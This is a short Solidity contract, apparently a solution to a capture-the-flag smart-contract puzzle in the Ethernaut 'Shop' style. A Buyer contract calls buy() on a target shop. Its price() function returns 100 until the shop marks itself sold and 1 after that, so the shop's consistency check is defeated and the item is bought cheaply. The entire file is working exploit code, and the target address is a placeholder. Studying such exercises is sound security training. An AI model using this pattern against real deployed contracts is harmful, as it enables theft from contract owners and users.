// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
}

abstract contract Shop is IShop {
    bool public isSold;
}

contract Buyer {
    bool isCalled = false;
    Shop s = Shop(<address of contract>);

    function attack() public {
        s.buy();
    }

    function price() public view returns (uint) {
        if (!s.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }
}